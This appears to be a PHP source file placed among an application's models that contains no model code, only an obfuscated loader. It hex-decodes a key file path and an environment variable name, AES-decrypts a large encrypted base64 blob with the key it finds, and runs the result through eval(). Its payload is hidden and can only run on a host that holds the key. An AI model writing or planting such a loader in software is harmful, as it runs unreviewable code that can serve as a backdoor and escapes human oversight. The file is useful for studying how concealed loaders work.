<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('22OLBd2Rj32Hwn90rWKpZw==');
$c=base64_decode(
'9EKCdnPCV4bt6pTiq0q3z+SPfdwt36syIXna5/qrp9YwPLO5Nnk2iTqNtvOu44YeN8MxOpCMpaFd' .
'iP7Ax4Yo75keZXxwW20NnWEfGUtumRnMZodrmGe6P9+h8n/nM6CldZLmGKAF8kVIdfxZJ8u0g5Q/' .
'ImXhmFO/iz104593zfHBneh8Cbym+/G+D7XGtptWZ6ZyVvLuL2hPuEK8C56gjqTtWttS2K9uFD5N' .
'HDVSnSwrYLPgkmPwwl05MDeCBhB9cpWcBnswq0IHP3JvVrdy88P1fRTaqRxe46ugwWgCqJbZNRwk' .
'L8q5IdGJO3rhvssmXnmgpswBX8sysvFUxS/7lAvBGthjZZege7Iw53w2c4Tdv1a/m0+A79l7F2RT' .
'M0GAirS4DivheAuDm6IJ02+MWh39w6rB8C1Q7a/jyzFXCC6TZi50GaCAdA+qhT8+cUFHZAMoH6O/' .
'8JfHqDrDYWJJRkC2pJi2B+HtNdxNFbbrtIyqosG1M8SXh5TN722McxVHdKKS96YB6NXuLd/nuksR' .
'SNtolRYBQhEv8i68nFuC1OFaqWnH18ORnF5oVqW4uMcK2gMEUbD3g9OR6CStoZ+wRb19xoMw7eWj' .
'PJRfZbqlXH6OPq/aFZyYK4j/edqUbpYeOLoybipkmRf4nCCVddYzAHfN9N+a1Geeu015jp3tNcol' .
'f1OuBE8o534VKSXMSJj0FN3iztIGM59hlZN3GMCWNi/0PfAmmWl1PX+G3F8ncDq0lWknRD11qJT4' .
'PfjgOACEnwh81KrVigeQyDmUuchbpdMOyKAnHyDosUVwL2uUYbqXX5x1q5qcQ9AQDRAGWLWh9pM+' .
'YDGRMvQzVtUPp3mUkPxN0YZYY3ZLrhI1AsQzthxfKo4atghotWPQsODAdx6xIEefmJs8Ntk9qfih' .
'7T/L3rOAmSUy1LnwqNZG6TS0JD1fa4VhNlspBe+qjiKbqirdSqjvZzB7oEhWz//YR599XQ=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
